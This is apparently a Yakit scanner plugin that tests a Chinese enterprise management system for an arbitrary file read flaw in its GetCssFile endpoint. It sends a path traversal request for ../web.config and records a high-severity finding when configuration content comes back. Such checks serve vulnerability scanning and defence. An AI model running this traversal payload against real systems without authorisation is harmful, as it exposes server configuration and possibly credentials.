yakit.AutoInitYakit()

handleCheck = func(target, port) {
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `GET /Utility/GetCssFile?filePath=../web.config HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

`

    rsp, req, _ = poc.HTTP(packet1, poc.params({"target": addr}), poc.https(isTls), poc.redirectTimes(0), poc.timeout(5))

    //dump(rsp)
    if str.MatchAllOfSubString(rsp, 'HTTP/1.1 200', '<configSections><section') {
        yakit.Info(
            "%v found 赛蓝企业管理系统GetCssFile存在任意文件读取漏洞", 
            addr, 
        )
        risk.NewRisk(
            addr, 
            risk.title("赛蓝企业管理系统GetCssFile存在任意文件读取漏洞"), 
            risk.severity("high"), 
            risk.titleVerbose("赛蓝企业管理系统GetCssFile存在任意文件读取漏洞"), 
            risk.request(string(req)), 
            risk.response(string(rsp)), 
            risk.cve("no cve"), 
        )
    }

    return
}

handle = func(result /* *fp.MatchResult */) {
    if !result.IsOpen() {
        return
    }


    if len(result.Fingerprint.HttpFlows) > 0 {
        handleCheck(result.Target, result.Port)
    }

}
